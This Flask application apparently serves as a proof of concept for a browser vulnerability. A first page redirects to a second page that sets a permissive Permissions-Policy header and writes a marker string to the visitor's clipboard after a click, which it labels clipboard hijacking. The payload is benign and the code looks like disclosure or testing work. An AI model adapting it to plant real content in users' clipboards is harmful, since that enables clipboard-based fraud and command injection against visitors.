from flask import Flask, Response

app = Flask(__name__)

@app.route("/stage1")
def stage1():
    html_payload = """
    <!DOCTYPE html>
    <html lang="en">
    <body style="background: #e0f7fa; font-family: monospace; text-align: center; padding-top: 20px;">
        <button id="btnLanjut" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
            GAS
        </button>
        
        <div id="log" style="margin-top: 15px; text-align: left;"></div>

        <script>
            document.getElementById("btnLanjut").addEventListener("click", (e) => {
                document.getElementById("log").innerHTML += `> Button clicked (isTrusted: ${e.isTrusted})<br>`;
                document.getElementById("log").innerHTML += "> Redirecting...<br>";
                
                window.location.href = "https://user-activation-production.up.railway.app/exploit";
            });
        </script>
    </body>
    </html>
    """
    return Response(html_payload, mimetype="text/html")
@app.route("/exploit")
def exploit():
    html_payload = """
    <!DOCTYPE html>
    <html lang="en">
    <body style="background: #ffe6e6; font-family: monospace; text-align: center; padding-top: 20px;">
        <button id="btnHijack" style="padding: 10px 20px; background: red; color: white; font-size: 16px; font-weight: bold; cursor: pointer;">
            HIJACK CLIPBOARD
        </button>

        <div id="log" style="margin-top: 15px; text-align: left;"></div>

        <script>
            document.getElementById("btnHijack").addEventListener("click", async (e) => {
                const logDiv = document.getElementById("log");
                logDiv.innerHTML += `> Hijack clicked (isTrusted: ${e.isTrusted})<br>`;
                
                try {
                    await navigator.clipboard.writeText("PoC VULNERABLE - 1-Click Bypass via HTTP Header");
                    logDiv.innerHTML += "<span style='color: green; font-weight: bold;'>> SUCCESS: Clipboard Hijacked!</span><br>";
                } catch (err) {
                    logDiv.innerHTML += `<span style='color: red;'>> BLOCKED: ${err.message}</span><br>`;
                }
            });
        </script>
    </body>
    </html>
    """
    
    resp = Response(html_payload, mimetype="text/html")
    
    resp.headers["Permissions-Policy"] = "clipboard-write=(*)"
    
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)